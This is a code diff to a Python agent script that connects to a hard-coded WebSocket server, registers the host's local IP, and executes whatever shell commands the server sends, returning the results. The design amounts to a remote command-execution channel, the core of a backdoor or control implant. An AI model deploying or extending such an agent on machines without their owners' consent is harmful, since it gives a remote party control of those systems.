@@ -12,6 +12,21 @@ import websockets
 
 SERVER_URL = "ws://192.168.43.226:9000"
 
+
+async def send_register(websocket):
+    agent_ip = get_local_ip()
+    register_payload = {
+        "type": "register",
+        "ip": agent_ip
+    }
+    await websocket.send(json.dumps(register_payload))
+    print(f"Agent Saved : {agent_ip}")
+
+
+
+
+
+
 # Fonction pour récupérer l'adresse IP locale de la machine de manière plus robuste
 def get_local_ip():
     # Obtenir l'adresse IP de l'interface réseau active
@@ -311,6 +326,8 @@ async def send_data(websocket):
             print(f"[SEND ERROR] {e}")
             raise e
 
+
+
 async def execute_command(command):
     """Exécute la commande reçue par le WebSocket et retourne le résultat."""
     try:
@@ -326,6 +343,8 @@ async def execute_command(command):
         return f"Erreur lors de l'exécution de la commande: {e}"
 
 
+
+
 # ======================
 # 📡 Réception de commandes
 # ======================
@@ -336,13 +355,14 @@ async def receive_commands(websocket):
             data = json.loads(message)
             if data.get("type") == "command":
                 command = data.get("command")
-                print(f"[COMMANDE REÇUE] {command}")
+                print(f"[COMMANDE RECEIVED] {command}")
                 result = await execute_command(command)
                 response = {
                     "type": "command_result",
                     "result": result
                 }
                 await websocket.send(json.dumps(response))
+                
     except websockets.exceptions.ConnectionClosedOK:
         print("[INFO] Connexion fermée proprement.")
     except websockets.exceptions.ConnectionClosedError as e:
@@ -354,6 +374,8 @@ async def receive_commands(websocket):
         print("[INFO] Connexion WebSocket fermée.")
 
 
+
+
 # ======================
 # 🚀 Main : gérer la connexion WebSocket
 # ======================
@@ -361,7 +383,10 @@ async def main():
     while True:
         try:
             async with websockets.connect(SERVER_URL) as websocket:
-                print("[+] Connecté au serveur.")
+                print("[+] Connected to server.")
+
+                await send_register(websocket) 
+
 
                 send_task = asyncio.create_task(send_data(websocket))
                 recv_task = asyncio.create_task(receive_commands(websocket))
@@ -380,7 +405,7 @@ async def main():
 
                 print("[INFO] Connexion WebSocket fermée.")
         except Exception as e:
-            print(f"[MAIN ERROR] {e} | Reconnexion dans 5 secondes...")
+            print(f"[MAIN ERROR] {e} | Reconnecting 5 secondes...")
             await asyncio.sleep(5)
 
 
